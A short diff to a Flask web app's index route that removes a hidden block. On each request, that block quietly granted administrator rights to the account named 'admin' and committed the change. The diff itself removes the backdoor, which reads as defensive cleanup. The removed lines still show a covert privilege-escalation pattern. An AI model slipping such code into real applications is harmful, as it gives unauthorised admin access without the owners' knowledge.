@@ -14,13 +14,6 @@ from app.services import (
 @bp.route('/index', methods=['GET', 'POST'])
 @login_required
 def index():
-    try:
-        me = User.query.filter_by(username='admin').first()
-        if me and hasattr(me, 'is_admin') and not me.is_admin:
-            me.is_admin = True
-            db.session.commit()
-    except Exception:
-        db.session.rollback()
 
     if request.method == 'POST':
         body = request.form.get('body')
